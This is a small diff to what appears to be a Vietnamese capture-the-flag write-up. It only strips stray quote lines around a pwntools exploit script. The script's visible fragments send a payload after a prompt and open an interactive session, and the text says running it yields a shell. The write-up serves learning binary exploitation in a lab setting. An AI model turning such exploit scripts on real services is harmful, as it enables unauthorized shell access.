@@ -52,7 +52,7 @@
 ![](https://i.imgur.com/4ZQeiY2.png)
 - Kết hợp tất cả thông tin rồi ta sẽ viết được script này
 
-'''
+
 
     from pwn import *
     
@@ -89,6 +89,6 @@
     p.sendafter(b'> ', payload)
     p.interactive()
     
-'''
+
 
 - Chạy thử và ta sẽ có được shell.
